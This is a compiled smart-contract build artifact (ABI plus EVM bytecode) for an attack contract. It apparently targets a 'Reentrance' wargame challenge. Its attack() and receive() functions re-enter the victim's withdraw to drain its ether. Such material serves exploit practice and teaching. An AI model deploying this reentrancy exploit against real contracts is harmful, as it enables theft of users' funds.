{"abi":[{"type":"constructor","inputs":[{"name":"_victim","type":"address","internalType":"address"}],"stateMutability":"nonpayable"},{"type":"receive","stateMutability":"payable"},{"type":"function","name":"attack","inputs":[],"outputs":[],"stateMutability":"payable"},{"type":"function","name":"victim","inputs":[],"outputs":[{"name":"","type":"address","internalType":"contract Reentrance"}],"stateMutability":"view"}],"bytecode":{"object":"0x60a060405234801561001057600080fd5b506040516104313803806104318339818101604052602081101561003357600080fd5b5051606081901b6001600160601b0319166080526001600160a01b03166103b361007e600039806036528060d7528061019952806101bd5280610246528061031a52506103b36000f3fe60806040526004361061002d5760003560e01c8063930c20031461015c5780639e5faafc1461018d57610157565b366101575760007f00000000000000000000000000000000000000000000000000000000000000006001600160a01b03166370a08231306040518263ffffffff1660e01b815260040180826001600160a01b0316815260200191505060206040518083038186803b1580156100a157600080fd5b505afa1580156100b5573d6000803e3d6000fd5b505050506040513d60208110156100cb57600080fd5b505190508015610154577f00000000000000000000000000000000000000000000000000000000000000006001600160a01b0316632e1a7d4d826040518263ffffffff1660e01b815260040180828152602001915050600060405180830381600087803b15801561013b57600080fd5b505af115801561014f573d6000803e3d6000fd5b505050505b50005b600080fd5b34801561016857600080fd5b50610171610197565b604080516001600160a01b039092168252519081900360200190f35b6101956101bb565b005b7f000000000000000000000000000000000000000000000000000000000000000081565b7f00000000000000000000000000000000000000000000000000000000000000006001600160a01b031662362a9534306040518363ffffffff1660e01b815260040180826001600160a01b031681526020019150506000604051808303818588803b15801561022957600080fd5b505af115801561023d573d6000803e3d6000fd5b505050505060007f00000000000000000000000000000000000000000000000000000000000000006001600160a01b03166370a08231306040518263ffffffff1660e01b815260040180826001600160a01b0316815260200191505060206040518083038186803b1580156102b157600080fd5b505afa1580156102c5573d6000803e3d6000fd5b505050506040513d60208110156102db57600080fd5b5051604080517f2e1a7d4d0000000000000000000000000000000000000000000000000000000081526004810183905290519192506001600160a01b037f00000000000000000000000000000000000000000000000000000000000000001691632e1a7d4d9160248082019260009290919082900301818387803b15801561036257600080fd5b505af1158015610376573d6000803e3d6000fd5b505050505056fea2646970667358221220dccee2fb52fac283937f0dc98e3f73fe40f17c30631144c5786477ca7eb9dd4c64736f6c634300060c0033","linkReferences":{}},"methodIdentifiers":{"attack()":"9e5faafc","victim()":"930c2003"},"id":0}